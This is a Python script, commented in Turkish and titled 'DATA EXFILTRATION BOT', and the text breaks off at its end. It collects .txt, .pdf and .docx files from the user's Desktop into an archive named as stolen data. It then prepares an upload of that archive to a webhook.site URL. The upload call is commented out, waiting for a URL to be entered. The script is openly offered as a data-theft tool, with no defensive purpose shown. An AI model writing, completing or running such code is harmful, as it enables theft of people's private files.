import os
import zipfile
import requests

print("--- DATA EXFILTRATION BOT ---")

extensions = [".txt", ".pdf", ".docx"]
loot_file = "calinan_veriler.zip"
# Test için webhook.site kullanabilirsin
target_url = "https://webhook.site/YOUR-UUID-HERE" 

def hunt_and_compress():
    print("[*] Masaüstündeki kritik dosyalar toplaniyor...")
    with zipfile.ZipFile(loot_file, 'w') as zf:
        desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
        for root, dirs, files in os.walk(desktop):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    full_path = os.path.join(root, file)
                    print(f"   -> Arşive eklendi: {file}")
                    try: zf.write(full_path, arcname=file)
                    except: pass

def exfiltrate():
    print(f"[*] {loot_file} sunucuya yükleniyor...")
    try:
        # Gerçekten dosya yükleme işlemi yapar
        # with open(loot_file, 'rb') as f:
        #    requests.post(target_url, files={'file': f})
        print("✅ Yükleme kodu hazır (URL girilirse çalışır).")
    except Exception as e:
        print(f"H")